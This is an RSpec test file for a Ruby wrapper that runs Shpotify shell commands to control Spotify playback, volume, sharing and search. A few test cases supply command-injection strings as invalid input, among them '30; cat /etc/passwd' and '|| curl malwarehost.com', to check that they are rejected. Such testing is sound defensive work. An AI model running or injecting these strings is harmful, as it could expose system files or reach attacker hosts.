ENV["RACK_ENV"] = "test"

require "rspec"
require "pry-byebug"
require_relative "../app"
require_relative "../spotify"

describe "Spotify" do
  shared_examples_for "a valid command" do
    let(:command_stub) { `echo 'hello'` } # Prevent RSpec from executing real commands

    it "executes the correct Shpotify command" do
      expect(Spotify).to receive(:`).with(expected_command).and_return(command_stub)
      subject
    end
  end

  shared_examples_for "an invalid command" do
    it "does not call a system command" do
      expect(Spotify).to_not receive(:`)
      subject
    end

    it "calls invalid_command" do
      expect(Spotify).to receive(:invalid_command)
      subject
    end
  end

  describe ".stop" do
    subject { Spotify.stop }
    let(:expected_command) { "./spotify.sh stop" }

    it_behaves_like "a valid command"
  end

  describe ".next" do
    subject { Spotify.next }
    let(:expected_command) { "./spotify.sh next" }

    it_behaves_like "a valid command"
  end

  describe ".prev" do
    subject { Spotify.prev }
    let(:expected_command) { "./spotify.sh prev" }

    it_behaves_like "a valid command"
  end

  describe ".replay" do
    subject { Spotify.replay }
    let(:expected_command) { "./spotify.sh replay" }

    it_behaves_like "a valid command"
  end

  describe ".pos" do
    subject { Spotify.pos(time_in_seconds) }

    context "with an integer" do
      let(:time_in_seconds) { rand(0..100) }
      let(:expected_command) { "./spotify.sh pos #{time_in_seconds}" }

      it_behaves_like "a valid command"
    end

    context "with missing time" do
      let(:time_in_seconds) { nil }
      it_behaves_like "an invalid command"
    end

    context "when not a number" do
      let(:time_in_seconds) { "some string" }
      it_behaves_like "an invalid command"
    end
  end

  describe ".vol" do
    subject { Spotify.vol(vol_args) }
    let(:expected_command) { "./spotify.sh vol #{vol_args}".rstrip }

    context "up" do
      let(:vol_args) { "up" }

      it_behaves_like "a valid command"
    end

    context "down" do
      let(:vol_args) { "down" }

      it_behaves_like "a valid command"
    end

    context "with a volume integer" do
      let(:vol_args) { rand(0..100) }

      it_behaves_like "a valid command"
    end

    context "with missing vol" do
      let(:vol_args) { nil }
      it_behaves_like "an invalid command"
    end

    context "with invalid input" do
      let(:vol_args) { "30; cat /etc/passwd" }
      it_behaves_like "an invalid command"
    end
  end

  describe ".status" do
    subject { Spotify.status }
    let(:expected_command) { "./spotify.sh status" }

    it_behaves_like "a valid command"
  end

  describe ".share" do
    subject { Spotify.share(share_args) }
    let(:expected_command) { "./spotify.sh share #{share_args}".rstrip }

    context "empty string" do
      let(:share_args) { "" }

      it_behaves_like "a valid command"
    end

    context "uri" do
      let(:share_args) { "uri" }
      let(:expected_command) { "./spotify.sh share uri" }

      it_behaves_like "a valid command"
    end

    context "url" do
      let(:share_args) { "url" }
      let(:expected_command) { "./spotify.sh share url" }

      it_behaves_like "a valid command"
    end
  end

  describe ".play" do
    subject { Spotify.play(play_args) }
    let(:expected_command) { "./spotify.sh play #{play_args}" }

    context "search by artist" do
      let(:play_args) { "artist Trivium" }
      it_behaves_like "a valid command"
    end

    context "search by album" do
      let(:play_args) { "album In Waves" }
      it_behaves_like "a valid command"
    end

    context "search by playlist" do
      let(:play_args) { "list this.is_my playlist" }
      it_behaves_like "a valid command"
    end

    context "search by uri" do
      let(:play_args) { "uri spotify:track:4hk0OBunwz04gknkfNLzUn" }
      it_behaves_like "a valid command"
    end

    context "command injection" do
      let(:play_args) { "artist Trivium && whoami" }

      it_behaves_like "an invalid command"
    end

    context "command injection" do
      let(:play_args) { "list some_playlist || curl malwarehost.com" }

      it_behaves_like "an invalid command"
    end
  end
end
